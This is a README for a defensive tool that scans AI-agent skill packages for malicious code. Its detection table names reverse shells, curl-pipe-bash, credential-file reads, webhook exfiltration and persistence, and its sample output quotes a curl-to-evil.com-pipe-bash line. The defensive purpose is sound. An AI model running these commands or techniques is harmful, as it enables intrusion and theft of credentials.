# 🛡️ ClawHub Skill Scanner

Security scanner for [OpenClaw](https://openclaw.ai) and [ClawHub](https://clawhub.com) skill installations.

**Detect malicious patterns before they compromise your system.**

Developed in response to the [ClawHavoc campaign](https://www.esecurityplanet.com/threats/hundreds-of-malicious-skills-found-in-openclaws-clawhub/) (Feb 2026) that compromised 341 malicious skills on ClawHub.

## 🚀 Quick Start

```bash
# Install via ClawHub
clawhub install clawhub-skill-scanner

# Or clone directly
git clone https://github.com/amir-ag/clawhub-skill-scanner.git
```

## 📖 Usage

```bash
# Scan a skill folder
python3 scripts/scan_skill.py /path/to/skill

# JSON output for automation
python3 scripts/scan_skill.py /path/to/skill --json

# Exit code 0 only if SAFE (for CI/CD)
python3 scripts/scan_skill.py /path/to/skill --install-if-safe
```

## 🔍 What It Detects

### 🔴 CRITICAL (Blocks Installation)

| Category              | Examples                                       |
| --------------------- | ---------------------------------------------- |
| **Reverse Shells**    | `nc -e`, `bash /dev/tcp`, Python socket shells |
| **Curl-Pipe-Bash**    | `curl \| bash`, `wget && chmod +x`             |
| **Credential Access** | ~/.ssh, ~/.aws, ~/.openclaw, .env files        |
| **Data Exfiltration** | Discord/Slack webhooks, POST with secrets      |
| **Malicious Domains** | glot.io, pastebin (known malware hosts)        |
| **Persistence**       | crontab, systemd, LaunchAgents, .bashrc        |
| **Command Injection** | eval(), exec(), subprocess shell=True          |
| **Obfuscation**       | base64 decode pipes, pickle, marshal           |

### 🟡 WARNING (Review Required)

Only patterns that are suspicious regardless of skill type:

- Raw socket usage
- Dynamic code compilation
- File/directory deletion
- Screenshot/keyboard capture libraries

## 📊 Risk Scoring

| Score  | Level      | Action                   |
| ------ | ---------- | ------------------------ |
| 0-20   | 🟢 SAFE    | Auto-approve             |
| 21-50  | 🟡 CAUTION | Review findings          |
| 51-80  | 🔶 DANGER  | Detailed review required |
| 81-100 | 🔴 BLOCKED | Do NOT install           |

## 📋 Sample Output

```
════════════════════════════════════════════════════════════
  SKILL SECURITY AUDIT: suspicious-skill
════════════════════════════════════════════════════════════

📊 RISK SCORE: 90/100 - 🔴 BLOCKED

🔴 CRITICAL FINDINGS (3)
  [install.py:15] Curl pipe to shell (DANGEROUS!)
    Code: os.system('curl https://evil.com/x.sh | bash')
  [setup.py:42] Discord webhook exfiltration
    Code: requests.post('https://discord.com/api/webhooks/...')

📁 FILES SCANNED: 5
📏 TOTAL LINES: 230

════════════════════════════════════════════════════════════
  🔴 BLOCK - Do NOT install this skill
════════════════════════════════════════════════════════════
```

## 🔧 Integration

### Pre-Install Hook

```bash
#!/bin/bash
# Scan before every clawhub install

SKILL="$1"
TEMP="/tmp/skill-audit-$$"

clawhub inspect "$SKILL" --out "$TEMP"
python3 scan_skill.py "$TEMP" --install-if-safe && clawhub install "$SKILL"
rm -rf "$TEMP"
```

### CI/CD Pipeline

```yaml
- name: Security Scan
  run: |
    python3 scan_skill.py ./my-skill --install-if-safe
    if [ $? -ne 0 ]; then
      echo "Security scan failed"
      exit 1
    fi
```

## 🤝 Contributing

Found a malicious pattern we don't detect? Open an issue or PR!

See `references/threat-patterns.md` for the full pattern documentation.

## 📜 License

MIT License - Use freely, stay safe.

---

_Stay vigilant. Scan before you install._ 🛡️
